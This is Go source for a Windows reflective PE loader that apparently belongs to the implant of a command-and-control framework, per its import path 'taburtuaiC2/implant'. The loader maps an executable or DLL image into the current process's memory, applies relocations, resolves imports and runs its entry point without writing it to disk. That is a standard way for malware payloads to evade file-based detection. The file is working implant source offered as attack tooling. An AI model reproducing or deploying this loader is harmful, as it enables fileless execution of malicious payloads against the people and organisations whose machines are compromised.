//go:build windows

package exec

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// PeLoad loads rawPE in-memory and, for DLLs, calls DllMain(ATTACH).
// For EXEs it calls the entry point in a new goroutine.
func PeLoad(rawPE []byte) (uintptr, error) {
	if len(rawPE) < 0x40 {
		return 0, fmt.Errorf("peloader: image too small")
	}

	if binary.LittleEndian.Uint16(rawPE[0:2]) != 0x5A4D {
		return 0, fmt.Errorf("peloader: invalid MZ signature")
	}
	peOff := binary.LittleEndian.Uint32(rawPE[0x3C:])
	if int(peOff)+0x18 > len(rawPE) {
		return 0, fmt.Errorf("peloader: PE offset out of bounds")
	}
	if binary.LittleEndian.Uint32(rawPE[peOff:]) != 0x00004550 {
		return 0, fmt.Errorf("peloader: invalid PE signature")
	}

	machine := binary.LittleEndian.Uint16(rawPE[peOff+4:])
	if machine != 0x8664 {
		return 0, fmt.Errorf("peloader: only AMD64 PE is supported (got 0x%X)", machine)
	}

	numSections := binary.LittleEndian.Uint16(rawPE[peOff+6:])
	optHdrOff := peOff + 24
	magic := binary.LittleEndian.Uint16(rawPE[optHdrOff:])
	if magic != 0x020B {
		return 0, fmt.Errorf("peloader: expected PE32+ optional header (got 0x%X)", magic)
	}

	imageBase := binary.LittleEndian.Uint64(rawPE[optHdrOff+24:])
	sizeOfImage := binary.LittleEndian.Uint32(rawPE[optHdrOff+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(rawPE[optHdrOff+60:])
	entryPointRVA := binary.LittleEndian.Uint32(rawPE[optHdrOff+16:])
	isDLL := binary.LittleEndian.Uint16(rawPE[peOff+22:])&0x2000 != 0

	relocRVA := binary.LittleEndian.Uint32(rawPE[optHdrOff+128:])
	relocSize := binary.LittleEndian.Uint32(rawPE[optHdrOff+132:])
	importRVA := binary.LittleEndian.Uint32(rawPE[optHdrOff+104:])

	allocBase, _, _ := winsyscall.ProcVirtualAllocEx.Call(
		uintptr(^uintptr(0)-1),
		uintptr(imageBase),
		uintptr(sizeOfImage),
		uintptr(winsyscall.MemCommit|winsyscall.MemReserve),
		uintptr(winsyscall.PageReadWrite),
	)
	if allocBase == 0 {
		allocBase, _, _ = winsyscall.ProcVirtualAllocEx.Call(
			uintptr(^uintptr(0)-1),
			0,
			uintptr(sizeOfImage),
			uintptr(winsyscall.MemCommit|winsyscall.MemReserve),
			uintptr(winsyscall.PageReadWrite),
		)
	}
	if allocBase == 0 {
		return 0, fmt.Errorf("peloader: VirtualAlloc(%d bytes) failed", sizeOfImage)
	}

	hdrDst := unsafe.Slice((*byte)(unsafe.Pointer(allocBase)), sizeOfHeaders)
	copy(hdrDst, rawPE[:sizeOfHeaders])

	sectionTableOff := uintptr(optHdrOff) + 240
	for i := 0; i < int(numSections); i++ {
		sec := rawPE[sectionTableOff+uintptr(i)*40:]
		virtualAddr := binary.LittleEndian.Uint32(sec[12:])
		virtualSize := binary.LittleEndian.Uint32(sec[8:])
		rawOff := binary.LittleEndian.Uint32(sec[20:])
		rawSize := binary.LittleEndian.Uint32(sec[16:])
		if rawSize == 0 {
			continue
		}
		copyLen := rawSize
		if copyLen > virtualSize {
			copyLen = virtualSize
		}
		dst := unsafe.Slice((*byte)(unsafe.Pointer(allocBase+uintptr(virtualAddr))), copyLen)
		copy(dst, rawPE[rawOff:rawOff+copyLen])
	}

	delta := int64(allocBase) - int64(imageBase)
	if delta != 0 && relocRVA != 0 && relocSize != 0 {
		if err := peApplyRelocs(allocBase, rawPE, relocRVA, relocSize, delta); err != nil {
			winsyscall.ProcVirtualFreeEx.Call(uintptr(^uintptr(0)-1), allocBase, 0, uintptr(winsyscall.MemRelease))
			return 0, fmt.Errorf("peloader: relocation: %w", err)
		}
	}

	if importRVA != 0 {
		if err := peResolveImports(allocBase, importRVA); err != nil {
			winsyscall.ProcVirtualFreeEx.Call(uintptr(^uintptr(0)-1), allocBase, 0, uintptr(winsyscall.MemRelease))
			return 0, fmt.Errorf("peloader: imports: %w", err)
		}
	}

	peSetSectionProtections(allocBase, rawPE, sectionTableOff, numSections)

	ep := allocBase + uintptr(entryPointRVA)
	if isDLL {
		syscall.SyscallN(ep, allocBase, 1, 0)
	} else {
		go func() { syscall.SyscallN(ep) }()
	}

	return allocBase, nil
}

func peApplyRelocs(base uintptr, raw []byte, relocRVA, relocSize uint32, delta int64) error {
	off := uintptr(relocRVA)
	end := off + uintptr(relocSize)
	for off < end {
		if int(off+8) > len(raw) {
			break
		}
		pageRVA := binary.LittleEndian.Uint32(raw[off:])
		blockSize := binary.LittleEndian.Uint32(raw[off+4:])
		if blockSize < 8 {
			break
		}
		numEntries := (blockSize - 8) / 2
		for i := uint32(0); i < numEntries; i++ {
			entry := binary.LittleEndian.Uint16(raw[off+8+uintptr(i)*2:])
			relocType := entry >> 12
			relocOff := uint32(entry & 0x0FFF)
			if relocType == 10 {
				targetAddr := base + uintptr(pageRVA) + uintptr(relocOff)
				old := *(*int64)(unsafe.Pointer(targetAddr))
				*(*int64)(unsafe.Pointer(targetAddr)) = old + delta
			}
		}
		off += uintptr(blockSize)
	}
	return nil
}

func peResolveImports(base uintptr, importRVA uint32) error {
	for off := uintptr(importRVA); ; off += 20 {
		nameRVA := *(*uint32)(unsafe.Pointer(base + off + 12))
		iatRVA := *(*uint32)(unsafe.Pointer(base + off + 16))
		if nameRVA == 0 && iatRVA == 0 {
			break
		}
		dllNamePtr := (*byte)(unsafe.Pointer(base + uintptr(nameRVA)))
		dllName := winsyscall.HgCString(uintptr(unsafe.Pointer(dllNamePtr)))

		hDll, _, e := winsyscall.ProcLoadLibraryA.Call(
			uintptr(unsafe.Pointer(dllNamePtr)),
		)
		if hDll == 0 {
			return fmt.Errorf("LoadLibraryA(%s): %v", dllName, e)
		}

		iltRVA := *(*uint32)(unsafe.Pointer(base + off))
		if iltRVA == 0 {
			iltRVA = iatRVA
		}

		for slot := uintptr(0); ; slot += 8 {
			entry := *(*uint64)(unsafe.Pointer(base + uintptr(iltRVA) + slot))
			if entry == 0 {
				break
			}
			var procAddr uintptr
			if entry>>63 == 1 {
				ord := uint16(entry & 0xFFFF)
				procAddr, _ = windows.GetProcAddressByOrdinal(windows.Handle(hDll), uintptr(ord))
			} else {
				nameAddr := base + uintptr(uint32(entry)) + 2
				namePtr := (*byte)(unsafe.Pointer(nameAddr))
				procAddr, _ = windows.GetProcAddress(windows.Handle(hDll),
					winsyscall.HgCString(uintptr(unsafe.Pointer(namePtr))))
			}
			if procAddr == 0 {
				continue
			}
			iatEntry := base + uintptr(iatRVA) + slot
			*(*uintptr)(unsafe.Pointer(iatEntry)) = procAddr
		}
	}
	return nil
}

func peSetSectionProtections(base uintptr, raw []byte, tableOff uintptr, numSec uint16) {
	for i := 0; i < int(numSec); i++ {
		sec := raw[tableOff+uintptr(i)*40:]
		virtualAddr := binary.LittleEndian.Uint32(sec[12:])
		virtualSize := binary.LittleEndian.Uint32(sec[8:])
		characteristics := binary.LittleEndian.Uint32(sec[36:])
		if virtualSize == 0 {
			continue
		}

		var prot uint32 = winsyscall.PageReadWrite
		exec_ := characteristics&0x20000000 != 0
		read := characteristics&0x40000000 != 0
		write := characteristics&0x80000000 != 0

		switch {
		case exec_ && write:
			prot = winsyscall.PageExecRead // W^X: never RWX; code sections don't need write at runtime
		case exec_ && read:
			prot = winsyscall.PageExecRead
		case exec_:
			prot = winsyscall.PageExecRead
		case write:
			prot = winsyscall.PageReadWrite
		default:
			prot = 0x02 // PAGE_READONLY
		}

		var old uint32
		winsyscall.ProcVirtualProtect.Call(
			base+uintptr(virtualAddr),
			uintptr(virtualSize),
			uintptr(prot),
			uintptr(unsafe.Pointer(&old)),
		)
	}
}
